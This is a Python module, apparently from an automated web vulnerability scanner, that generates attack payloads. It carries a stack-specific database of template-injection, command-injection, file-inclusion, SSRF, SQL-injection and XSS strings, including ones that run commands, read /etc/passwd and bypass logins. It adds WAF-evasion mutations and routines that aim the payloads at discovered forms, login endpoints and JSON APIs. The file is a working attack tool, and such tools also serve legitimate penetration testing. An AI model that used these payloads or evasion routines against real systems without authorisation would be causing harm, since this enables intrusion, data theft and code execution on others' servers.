"""
Payload Generation Module

Generates context-aware payloads using AI + known payload database.
Includes WAF bypass mutations and encoding tricks.
"""
import json
import logging
import random
from urllib.parse import quote, quote_plus

from app.ai.llm_engine import LLMEngine

try:
    from app.modules.mutation_engine import MutationEngine
    _mutation_engine = MutationEngine()
    _HAS_MUTATION_ENGINE = True
except Exception:
    _mutation_engine = None
    _HAS_MUTATION_ENGINE = False

# ── Tech-specific payload database ──────────────────────────────────────
# Deterministic payloads proven effective against specific technology stacks.
# These bypass generic detection and target stack-specific sinks.
TECH_PAYLOADS: dict[str, dict[str, list[str]]] = {
    "ssti": {
        "jinja2": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        ],
        "twig": [
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{app.request.server.all|join(',')}}",
        ],
        "freemarker": [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${.api_built_ins?keys}',
            '<#list .data_model?keys as key>${key}</#list>',
        ],
        "erb": [
            "<%= system('id') %>",
            "<%= `id` %>",
            "<%= IO.popen('id').readlines() %>",
        ],
        "pebble": [
            '{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd) %}',
        ],
        "thymeleaf": [
            "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
        ],
        "mako": [
            "${__import__('os').popen('id').read()}",
            "<%import os%>${os.popen('id').read()}",
        ],
        "velocity": [
            '#set($x="")##\n#set($rt=$x.class.forName("java.lang.Runtime"))##\n#set($chr=$x.class.forName("java.lang.Character"))##\n#set($str=$x.class.forName("java.lang.String"))##\n#set($ex=$rt.getRuntime().exec("id"))',
        ],
    },
    "cmd_injection": {
        "php": [
            ";system('id');", "$(id)", "`id`", "|id",
            ";passthru('id');", ";exec('id');", ";shell_exec('id');",
            ";popen('id','r');",
        ],
        "python": [
            ";__import__('os').system('id')#",
            ";__import__('subprocess').check_output('id',shell=True)#",
            "';import os;os.system('id');'",
        ],
        "node": [
            ";require('child_process').execSync('id')//",
            "';require('child_process').exec('id')//",
            ";process.mainModule.require('child_process').execSync('id').toString()//",
        ],
        "java": [
            "';java.lang.Runtime.getRuntime().exec('id')//",
            '#{T(java.lang.Runtime).getRuntime().exec("id")}',
        ],
        "ruby": [
            ";`id`", ";system('id')", ";exec('id')", ";IO.popen('id').read",
        ],
    },
    "lfi": {
        "php": [
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "phar://test.phar/test.txt",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
            "expect://id",
            "/proc/self/environ",
        ],
        "java": [
            "..\\..\\..\\..\\..\\WEB-INF/web.xml",
            "..\\..\\..\\..\\..\\WEB-INF/classes/application.properties",
            "/WEB-INF/web.xml",
            "file:///etc/passwd",
        ],
        "node": [
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/proc/self/cmdline",
        ],
        "aspnet": [
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\web.config",
            "\\\\localhost\\c$\\windows\\win.ini",
        ],
    },
    "ssrf": {
        "java": [
            "jar:http://127.0.0.1!/",
            "netdoc:///etc/passwd",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_INFO",
        ],
        "php": [
            "dict://127.0.0.1:6379/INFO",
            "gopher://127.0.0.1:6379/_INFO",
            "php://filter/convert.base64-encode/resource=http://127.0.0.1",
            "file:///etc/passwd",
        ],
        "python": [
            "file:///etc/passwd",
            "http://0177.0.0.1/",
            "http://0x7f000001/",
            "http://[::1]/",
        ],
        "node": [
            "http://0177.0.0.1/",
            "http://127.1/",
            "http://0x7f.0x0.0x0.0x1/",
        ],
    },
    "sqli": {
        "mysql": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            "1' AND SLEEP(5)--",
        ],
        "postgresql": [
            "';SELECT pg_sleep(5)--",
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' UNION SELECT NULL,current_database(),NULL--",
            "1;SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ],
        "mssql": [
            "';WAITFOR DELAY '0:0:5'--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "';EXEC xp_cmdshell 'ping 127.0.0.1'--",
        ],
        "sqlite": [
            "' AND 1=randomblob(300000000)--",
            "' UNION SELECT sql FROM sqlite_master--",
            "' AND CASE WHEN(1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000)))) ELSE 1 END--",
        ],
        "oracle": [
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT version FROM v$instance))--",
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
            "' UNION SELECT NULL,banner,NULL FROM v$version--",
        ],
    },
    "xss": {
        "angular": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "<div ng-app>{{$eval.constructor('alert(1)')()}}</div>",
        ],
        "react": [
            "javascript:alert(1)//",  # href injection in React
            "<img src=x onerror=alert(1)>",
            "'-alert(1)-'",  # template literal injection
        ],
        "vue": [
            "{{_c.constructor('alert(1)')()}}",
            "v-html=\"<img src=x onerror=alert(1)>\"",
        ],
        "wordpress": [
            "<img src=x onerror=alert(document.cookie)>",
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "\"><img src=x onerror=alert(1)>",
        ],
    },
}

# Map technology names to their template engine / framework
_TECH_TO_TEMPLATE: dict[str, list[str]] = {
    # Python frameworks
    "flask": ["jinja2", "python"], "django": ["jinja2", "python"],
    "fastapi": ["jinja2", "python"], "tornado": ["python"],
    "bottle": ["python", "mako"],
    # PHP frameworks
    "php": ["php", "twig"], "laravel": ["php", "twig"],
    "symfony": ["php", "twig"], "wordpress": ["php", "wordpress"],
    "drupal": ["php", "twig"], "codeigniter": ["php"],
    # Java frameworks
    "java": ["java", "freemarker", "thymeleaf", "velocity"],
    "spring": ["java", "thymeleaf", "freemarker"],
    "spring boot": ["java", "thymeleaf"], "tomcat": ["java"],
    "struts": ["java", "freemarker", "velocity"],
    # Node.js
    "node.js": ["node"], "express": ["node"], "next.js": ["node", "react"],
    "nuxt": ["node", "vue"], "koa": ["node"],
    # Ruby
    "ruby": ["ruby", "erb"], "rails": ["ruby", "erb"],
    "sinatra": ["ruby", "erb"],
    # .NET
    "asp.net": ["aspnet"], ".net": ["aspnet"], "iis": ["aspnet"],
    # Databases
    "mysql": ["mysql"], "mariadb": ["mysql"], "postgresql": ["postgresql"],
    "postgres": ["postgresql"], "mssql": ["mssql"], "sql server": ["mssql"],
    "sqlite": ["sqlite"], "oracle": ["oracle"],
    # Frontend frameworks
    "angular": ["angular"], "react": ["react"], "vue": ["vue"],
    "vue.js": ["vue"],
}

logger = logging.getLogger(__name__)

# Map internal vuln_type names to MutationEngine context strings
_VULN_TYPE_TO_MUTATION_CTX = {
    "xss": "xss",
    "xss_reflected": "xss",
    "xss_stored": "xss",
    "sqli": "sqli",
    "sqli_blind": "sqli",
    "cmd_injection": "command",
    "rce": "command",
    "lfi": "path",
    "path_traversal": "path",
    "ssti": "generic",
    "ssrf": "generic",
    "idor": "generic",
    "open_redirect": "generic",
    "cors_misconfiguration": "generic",
}


def _mutate_for_waf(payload: str, vuln_type: str, waf_name: str = "", max_variants: int = 6) -> list[str]:
    """Generate WAF bypass mutations of a payload.
    Uses MutationEngine for comprehensive mutations, falls back to basic logic."""

    # Try MutationEngine first
    if _HAS_MUTATION_ENGINE and _mutation_engine:
        try:
            ctx = _VULN_TYPE_TO_MUTATION_CTX.get(vuln_type, "generic")
            variants = _mutation_engine.mutate(
                payload,
                context=ctx,
                waf_name=waf_name or None,
                max_variants=max_variants,
            )
            # mutate() returns original as first element — strip it
            return [v for v in variants if v != payload][:max_variants]
        except Exception as e:
            logger.debug("MutationEngine failed, using fallback: %s", e)

    # ── Fallback: original simple mutations ──
    mutations = []

    if vuln_type in ("xss", "xss_reflected", "xss_stored"):
        mutations.append(payload.replace("script", "ScRiPt").replace("alert", "aLeRt"))
        mutations.append(quote(payload, safe=""))
        mutations.append(payload.replace("onerror", "&#111;nerror").replace("onload", "&#111;nload"))
        mutations.append(payload.replace("<", "<%00").replace(">", "%00>"))

    elif vuln_type in ("sqli", "sqli_blind"):
        mutations.append(payload.replace(" ", "/**/"))
        mutations.append(payload.replace(" ", "%09"))
        mutations.append(payload.replace(" ", "%0a"))
        if "OR" in payload.upper():
            mutations.append(payload.replace("OR", "/*!50000OR*/").replace("or", "/*!50000OR*/"))
        mutations.append(payload.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")
                        .replace("select", "SeLeCt").replace("union", "UnIoN"))

    elif vuln_type in ("cmd_injection", "rce"):
        mutations.append(payload.replace(" ", "${IFS}"))
        mutations.append(payload.replace(" ", "$IFS$9"))
        if "id" in payload:
            mutations.append(payload.replace("id", "'i''d'"))
            mutations.append(payload.replace("id", "i\\d"))

    elif vuln_type in ("lfi", "path_traversal"):
        mutations.append(payload.replace("../", "%252e%252e%252f"))
        mutations.append(payload.replace("../", "..%c0%af"))
        mutations.append(payload.replace("../", "....//"))

    elif vuln_type == "ssrf":
        mutations.append(payload.replace("127.0.0.1", "2130706433"))
        mutations.append(payload.replace("127.0.0.1", "0x7f000001"))
        mutations.append(payload.replace("127.0.0.1", "[::ffff:127.0.0.1]"))

    return [m for m in mutations if m and m != payload][:max_variants]


VULN_TYPE_ALIASES = {
    "xss": "xss", "cross-site scripting": "xss", "reflected xss": "xss",
    "sqli": "sqli", "sql injection": "sqli", "sql": "sqli",
    "ssrf": "ssrf", "server-side request forgery": "ssrf",
    "ssti": "ssti", "server-side template injection": "ssti", "template injection": "ssti",
    "rce": "cmd_injection", "remote code execution": "cmd_injection", "command injection": "cmd_injection",
    "cmd_injection": "cmd_injection",
    "lfi": "lfi", "local file inclusion": "lfi", "path traversal": "lfi",
    "idor": "idor", "insecure direct object reference": "idor",
    "open_redirect": "open_redirect", "open redirect": "open_redirect",
    "cors": "cors_misconfiguration", "cors misconfiguration": "cors_misconfiguration",
}

CORE_VULN_TYPES = ["xss", "sqli", "cmd_injection", "ssrf", "ssti", "lfi"]


class PayloadGenerator:
    def __init__(self):
        self.llm = LLMEngine()

    def _normalize_vuln_types(self, raw_types: list[str]) -> list[str]:
        """Normalize AI-returned vuln type names to standard internal names."""
        normalized = []
        for vt in raw_types:
            vt_lower = vt.lower().strip()
            mapped = VULN_TYPE_ALIASES.get(vt_lower)
            if mapped:
                normalized.append(mapped)
            else:
                # Try partial match
                for alias, norm in VULN_TYPE_ALIASES.items():
                    if alias in vt_lower or vt_lower in alias:
                        normalized.append(norm)
                        break
        # Deduplicate preserving order
        seen = set()
        unique = []
        for v in normalized:
            if v not in seen:
                seen.add(v)
                unique.append(v)
        return unique

    async def generate(self, context: dict, db=None) -> list[dict]:
        """Generate payloads based on scan context."""
        payloads = []
        scan_results = context.get("scan_results", [])
        ai_strategy = context.get("ai_strategy", {})
        endpoints = context.get("endpoints", [])
        technologies = context.get("technologies", {})

        # RAG: Pre-load effective payloads from knowledge base
        self._kb_payloads: dict[str, list[str]] = {}
        if db:
            try:
                from app.core.knowledge import KnowledgeBase
                kb = KnowledgeBase()
                tech_list = list((technologies or {}).get("summary", {}).keys())
                tech = tech_list[0].lower() if tech_list else None
                for vt in (ai_strategy or {}).get("priority_vulns", CORE_VULN_TYPES):
                    vt_norm = VULN_TYPE_ALIASES.get(vt.lower().strip(), vt)
                    effective = await kb.get_effective_payloads(db, vt_norm, technology=tech)
                    if effective:
                        # Flatten payloads: use the full list when available (from PATT etc.)
                        all_p = []
                        for p in effective:
                            if p.get("payloads"):
                                all_p.extend(p["payloads"][:30])
                            elif p.get("payload"):
                                all_p.append(p["payload"])
                        self._kb_payloads[vt_norm] = all_p[:50]
            except Exception:
                pass

        # Determine which vuln types to target
        raw_priority = (ai_strategy or {}).get("priority_vulns", CORE_VULN_TYPES)
        priority_vulns = self._normalize_vuln_types(raw_priority)

        # Always include core vuln types
        for core in CORE_VULN_TYPES:
            if core not in priority_vulns:
                priority_vulns.append(core)

        waf_info = context.get("waf_info") or {}
        tech_summary = (technologies or {}).get("summary", {})

        tech_context = {
            "technology": json.dumps(tech_summary),
            "waf": waf_info.get("waf_name", "none"),
            "param_type": "string",
            "injection_point": "parameter",
        }

        # Generate LLM payloads for all vuln types in parallel
        import asyncio

        async def _gen_for_type(vt):
            try:
                return vt, await self.llm.generate_payloads(vt, tech_context)
            except Exception:
                return vt, self.llm._fallback_payloads(vt)

        llm_results = await asyncio.gather(*[_gen_for_type(vt) for vt in priority_vulns])

        has_waf = bool((context.get("waf_info") or {}).get("detected"))

        for vuln_type, raw_payloads in llm_results:
            # Ensure reliable fallback payloads come FIRST (AI may generate wrong types)
            fallback = self.llm._fallback_payloads(vuln_type)
            seen_payloads = set()
            merged = []
            # RAG: Add knowledge base effective payloads FIRST (proven to work)
            for kp in self._kb_payloads.get(vuln_type, []):
                if kp not in seen_payloads:
                    merged.append(kp)
                    seen_payloads.add(kp)
            # Add tech-specific deterministic payloads (proven for this stack)
            for tp in self._get_tech_payloads(vuln_type, technologies):
                if tp not in seen_payloads:
                    merged.append(tp)
                    seen_payloads.add(tp)
            # Add fallback payloads (they have matching detectors)
            for fp in fallback[:8]:
                if fp not in seen_payloads:
                    merged.append(fp)
                    seen_payloads.add(fp)
            # Then add AI-generated ones
            for rp in raw_payloads:
                if rp not in seen_payloads:
                    merged.append(rp)
                    seen_payloads.add(rp)

            # WAF bypass: generate mutations for top payloads
            if has_waf:
                waf_name = (context.get("waf_info") or {}).get("waf_name", "")
                waf_mutations = []

                # If MutationEngine available, use mutate_batch for efficiency
                if _HAS_MUTATION_ENGINE and _mutation_engine:
                    try:
                        ctx = _VULN_TYPE_TO_MUTATION_CTX.get(vuln_type, "generic")
                        batch_variants = _mutation_engine.mutate_batch(
                            merged[:8],
                            context=ctx,
                            waf_name=waf_name or None,
                            max_per_payload=6,
                        )
                        for m in batch_variants:
                            if m not in seen_payloads:
                                waf_mutations.append(m)
                                seen_payloads.add(m)
                    except Exception as e:
                        logger.debug("MutationEngine batch failed, falling back: %s", e)
                        for p in merged[:6]:
                            for m in _mutate_for_waf(p, vuln_type, waf_name=waf_name):
                                if m not in seen_payloads:
                                    waf_mutations.append(m)
                                    seen_payloads.add(m)
                else:
                    for p in merged[:6]:
                        for m in _mutate_for_waf(p, vuln_type, waf_name=waf_name):
                            if m not in seen_payloads:
                                waf_mutations.append(m)
                                seen_payloads.add(m)

                merged.extend(waf_mutations)

            raw_payloads = merged

            # Match payloads with endpoints — split budget between forms and GET params
            target_endpoints = self._get_endpoints_for_vuln(vuln_type, endpoints)
            form_eps = [e for e in target_endpoints if e.get("type") == "form"]
            get_eps = [e for e in target_endpoints if e.get("type") != "form"]

            # Deduplicate forms by URL, skip login/logout forms
            seen_form_urls = set()
            unique_forms = []
            login_keywords = ("login", "logout", "signin", "signup", "register")
            for fe in form_eps:
                url_lower = fe["url"].lower()
                # Skip login forms — they're for auth, not vuln testing
                if any(kw in url_lower for kw in login_keywords):
                    continue
                if fe["url"] not in seen_form_urls:
                    seen_form_urls.add(fe["url"])
                    unique_forms.append(fe)

            # Score and prioritize endpoints by attack potential
            scored_forms = sorted(unique_forms, key=self._endpoint_score, reverse=True)
            scored_gets = sorted(get_eps, key=self._endpoint_score, reverse=True)
            selected = scored_forms[:10] + scored_gets[:25]

            for endpoint in selected:
                for payload in raw_payloads[:20]:
                    if endpoint.get("type") == "form":
                        payloads.extend(
                            self._generate_form_payloads(endpoint, payload, vuln_type)
                        )
                    else:
                        payloads.append({
                            "vuln_type": vuln_type,
                            "payload": payload,
                            "target_url": endpoint.get("url"),
                            "params": endpoint.get("params", []),
                            "method": "GET",
                        })

        # Add POST-based SQLi payloads for login/auth endpoints
        if "sqli" in priority_vulns:
            payloads.extend(self._generate_post_sqli(endpoints, context.get("base_url", "")))

        # Add JSON body injection payloads for API endpoints
        payloads.extend(self._generate_api_json_payloads(endpoints, priority_vulns))

        return payloads

    @staticmethod
    def _endpoint_score(ep: dict) -> int:
        """Score an endpoint by attack potential (higher = more interesting)."""
        score = 0
        ep_type = ep.get("type", "")
        interest = ep.get("interest", "")
        discovery = ep.get("discovery", "")
        params = ep.get("params", [])
        fields = ep.get("fields", [])
        url = ep.get("url", "").lower()

        # Type scoring
        _TYPE_SCORES = {
            "injectable": 10, "api": 8, "admin": 8, "form": 7,
            "upload": 6, "parameterized": 5, "sensitive": 4, "page": 2,
        }
        score += _TYPE_SCORES.get(ep_type, 1)

        # Interest scoring
        _INTEREST_SCORES = {"critical": 8, "high": 6, "medium": 4, "low": 1}
        score += _INTEREST_SCORES.get(interest, 0)

        # More params = more injection points
        score += min(len(params), 5) * 2
        score += min(len(fields), 5) * 2

        # Discovery method scoring (JS extraction = likely real API)
        if discovery in ("js_extraction", "js_spa"):
            score += 4
        elif discovery == "graphql_introspection":
            score += 5

        # URL pattern bonuses
        if "/api/" in url or "/rest/" in url or "/v1/" in url or "/v2/" in url:
            score += 3
        if "admin" in url or "dashboard" in url or "manage" in url:
            score += 3
        if "search" in url or "query" in url or "filter" in url:
            score += 2

        return score

    @staticmethod
    def _get_tech_payloads(vuln_type: str, technologies: dict) -> list[str]:
        """Return deterministic payloads optimized for the detected tech stack."""
        if not technologies:
            return []
        tech_summary = (technologies or {}).get("summary", {})
        if not tech_summary:
            return []

        # Resolve detected tech names → template/framework keys
        resolved_keys: set[str] = set()
        for tech_name in tech_summary:
            tech_lower = tech_name.lower().strip()
            if tech_lower in _TECH_TO_TEMPLATE:
                resolved_keys.update(_TECH_TO_TEMPLATE[tech_lower])
            # Partial match: "PHP 8.1" → "php"
            for key, vals in _TECH_TO_TEMPLATE.items():
                if key in tech_lower or tech_lower.startswith(key):
                    resolved_keys.update(vals)

        if not resolved_keys:
            return []

        # Collect payloads for this vuln_type from matching tech keys
        type_payloads = TECH_PAYLOADS.get(vuln_type, {})
        result = []
        for tech_key in resolved_keys:
            for p in type_payloads.get(tech_key, []):
                if p not in result:
                    result.append(p)
        return result[:15]  # cap to prevent explosion

    def _generate_form_payloads(self, endpoint: dict, payload: str, vuln_type: str) -> list[dict]:
        """Generate POST payloads for HTML form endpoints."""
        results = []
        fields = endpoint.get("fields", [])
        hidden_fields = endpoint.get("hidden_fields", {})
        method = endpoint.get("method", "POST")
        url = endpoint.get("url", "")

        for field in fields:
            # Build POST body: inject payload into one field, fill others with benign values
            post_body = dict(hidden_fields)  # include CSRF tokens etc.
            for f in fields:
                if f == field:
                    post_body[f] = "PAYLOAD"
                else:
                    post_body[f] = "test"  # benign value

            result_entry = {
                "vuln_type": vuln_type,
                "payload": payload,
                "target_url": url,
                "method": method,
                "post_field": field,
                "source_page": endpoint.get("source_page", ""),
            }
            if method == "GET":
                # GET forms: inject via query params
                result_entry["params"] = [field]
                result_entry["post_body"] = None
            else:
                # POST forms: inject via request body
                result_entry["params"] = []
                result_entry["post_body"] = post_body
            results.append(result_entry)
        return results

    def _generate_post_sqli(self, endpoints: list[dict], base_url: str) -> list[dict]:
        """Generate POST-based SQLi payloads for login/auth endpoints."""
        post_payloads = []
        sqli_payloads = [
            "' OR 1=1--",
            "' OR '1'='1'--",
            "admin'--",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
        ]

        # Find login/auth endpoints from discovered URLs
        login_endpoints = []
        for e in endpoints:
            url_lower = e.get("url", "").lower()
            if any(p in url_lower for p in ["/login", "/auth", "/signin", "/user/login",
                                             "/rest/user/login", "/api/login", "/session"]):
                login_endpoints.append(e)

        # Also add common login paths if not already found
        common_login_paths = ["/rest/user/login", "/api/login", "/login"]
        for path in common_login_paths:
            full_url = f"{base_url}{path}"
            if not any(e.get("url") == full_url for e in login_endpoints):
                login_endpoints.append({"url": full_url})

        # Common login field names
        login_fields = [
            {"email": "PAYLOAD", "password": "password"},
            {"username": "PAYLOAD", "password": "password"},
            {"user": "PAYLOAD", "pass": "password"},
        ]

        for endpoint in login_endpoints[:5]:
            for sqli in sqli_payloads[:3]:
                for fields in login_fields[:2]:
                    post_payloads.append({
                        "vuln_type": "sqli",
                        "payload": sqli,
                        "target_url": endpoint.get("url"),
                        "params": [],
                        "method": "POST",
                        "post_body": fields,
                    })

        return post_payloads

    def _generate_api_json_payloads(self, endpoints: list[dict],
                                     priority_vulns: list[str]) -> list[dict]:
        """Generate JSON body injection payloads for API endpoints.

        Tests API endpoints with JSON POST bodies — covers cases where
        endpoints accept JSON but aren't HTML forms.
        """
        payloads = []
        # Find API-like endpoints (REST/GraphQL that likely accept JSON POST)
        api_eps = [
            e for e in endpoints
            if e.get("type") in ("api", "injectable")
            or "/api/" in e.get("url", "").lower()
            or "/rest/" in e.get("url", "").lower()
            or "/v1/" in e.get("url", "").lower()
            or "/v2/" in e.get("url", "").lower()
            or "/graphql" in e.get("url", "").lower()
        ]
        # Exclude endpoints already covered by form payloads or login SQLi
        api_eps = [e for e in api_eps if e.get("type") != "form"]

        # Common JSON field names by context
        _FIELD_TEMPLATES = {
            "search": [
                {"query": "PAYLOAD"},
                {"search": "PAYLOAD"},
                {"q": "PAYLOAD"},
                {"keyword": "PAYLOAD"},
                {"filter": "PAYLOAD"},
            ],
            "data": [
                {"name": "PAYLOAD", "value": "test"},
                {"title": "PAYLOAD", "description": "test"},
                {"comment": "PAYLOAD"},
                {"message": "PAYLOAD"},
                {"content": "PAYLOAD"},
                {"data": "PAYLOAD"},
                {"text": "PAYLOAD"},
                {"body": "PAYLOAD"},
            ],
            "id": [
                {"id": "PAYLOAD"},
                {"user_id": "PAYLOAD"},
                {"item_id": "PAYLOAD"},
            ],
            "file": [
                {"url": "PAYLOAD"},
                {"path": "PAYLOAD"},
                {"file": "PAYLOAD"},
                {"filename": "PAYLOAD"},
            ],
        }

        # Payload map: which JSON field templates to use per vuln type
        _VULN_FIELDS = {
            "xss": ["search", "data"],
            "sqli": ["search", "data", "id"],
            "ssti": ["search", "data"],
            "ssrf": ["file"],
            "cmd_injection": ["data", "file"],
            "lfi": ["file"],
            "path_traversal": ["file"],
        }

        for vuln_type in priority_vulns:
            field_groups = _VULN_FIELDS.get(vuln_type)
            if not field_groups:
                continue
            # Get payloads for this vuln type (already merged from KB+fallback+LLM)
            type_payloads = self._kb_payloads.get(vuln_type, [])
            if not type_payloads:
                type_payloads = self.llm._fallback_payloads(vuln_type)
            type_payloads = type_payloads[:5]  # limit per vuln type

            for ep in api_eps[:15]:
                # If endpoint has known params, use those as JSON field names
                ep_params = ep.get("params", [])
                if ep_params:
                    for param in ep_params[:3]:
                        for pl in type_payloads[:3]:
                            payloads.append({
                                "vuln_type": vuln_type,
                                "payload": pl,
                                "target_url": ep["url"].split("?")[0],  # strip query
                                "params": [],
                                "method": "POST",
                                "post_field": param,
                                "post_body": {param: "PAYLOAD"},
                            })
                else:
                    # No known params — try common field templates
                    for group in field_groups:
                        templates = _FIELD_TEMPLATES.get(group, [])
                        for tmpl in templates[:2]:
                            for pl in type_payloads[:2]:
                                payloads.append({
                                    "vuln_type": vuln_type,
                                    "payload": pl,
                                    "target_url": ep["url"].split("?")[0],
                                    "params": [],
                                    "method": "POST",
                                    "post_field": list(tmpl.keys())[0],
                                    "post_body": dict(tmpl),
                                })

        return payloads

    def _get_endpoints_for_vuln(self, vuln_type: str, endpoints: list[dict]) -> list[dict]:
        """Select the best endpoints to test for a specific vulnerability type.

        Forms are prioritized since they're more likely to have real injection points.
        """
        if vuln_type in ("xss", "sqli", "ssti", "cmd_injection"):
            matched = [
                e for e in endpoints
                if e.get("params") or e.get("type") in ("parameterized", "api", "injectable", "form")
            ]
            # Prioritize: forms first, then parameterized, then others
            matched.sort(key=lambda e: (0 if e.get("type") == "form" else 1))
            return matched
        elif vuln_type == "ssrf":
            _SSRF_PARAMS = [
                "url", "uri", "link", "redirect", "callback", "proxy", "fetch",
                "src", "dest", "target", "rurl", "domain", "host", "site",
                "html", "data", "load", "feed", "to", "out", "ref", "next",
                "continue", "return", "window", "go", "view", "show", "content",
                "document", "folder", "root", "prefix", "filename", "download",
                "open", "read", "get", "source", "import", "resource", "val",
                "image", "img", "icon", "logo", "avatar", "preview", "thumbnail",
                "webhook", "api", "endpoint", "service", "server", "forward",
            ]
            return [
                e for e in endpoints
                if any(p in str(e.get("params", [])).lower() for p in _SSRF_PARAMS)
                or e.get("type") == "injectable"
            ]
        elif vuln_type == "open_redirect":
            _REDIRECT_PARAMS = [
                "url", "redirect", "redirect_url", "redirect_uri", "return",
                "return_url", "return_to", "next", "next_url", "goto", "go",
                "target", "dest", "destination", "redir", "rurl", "continue",
                "forward", "forward_url", "out", "view", "ref", "checkout_url",
                "login_url", "logout", "callback", "callback_url", "jump",
                "to", "link", "navigate", "path", "success_url", "error_url",
                "fallback", "returnTo", "redirectTo", "RelayState", "saml",
            ]
            return [
                e for e in endpoints
                if any(p in str(e.get("params", [])).lower() for p in _REDIRECT_PARAMS)
                or e.get("type") == "injectable"
            ]
        elif vuln_type == "idor":
            _IDOR_PARAMS = [
                "id", "uid", "user_id", "account", "order", "order_id",
                "account_id", "profile", "profile_id", "doc", "doc_id",
                "invoice", "invoice_id", "item", "item_id", "no", "number",
                "file_id", "report", "report_id", "key", "email", "user",
                "username", "customer", "customer_id", "member", "member_id",
            ]
            return [
                e for e in endpoints
                if any(p in str(e.get("params", [])).lower() for p in _IDOR_PARAMS)
                or e.get("type") == "api"
            ]
        elif vuln_type in ("lfi", "path_traversal"):
            _LFI_URL_HINTS = [
                "/ftp", "/file", "/download", "/assets", "/upload", "/static",
                "/include", "/read", "/load", "/view", "/open", "/get",
                "/fetch", "/template", "/render", "/export",
            ]
            _LFI_PARAMS = [
                "file", "path", "page", "include", "template", "dir",
                "document", "folder", "root", "pg", "style", "pdf",
                "lang", "mod", "conf", "type", "name", "filename",
                "src", "source", "resource", "load", "read", "content",
            ]
            return [
                e for e in endpoints
                if any(p in e.get("url", "").lower() for p in _LFI_URL_HINTS)
                or any(p in str(e.get("params", [])).lower() for p in _LFI_PARAMS)
                or e.get("type") in ("upload", "injectable")
            ]
        else:
            return [e for e in endpoints if e.get("interest") in ("high", "critical", "medium")]
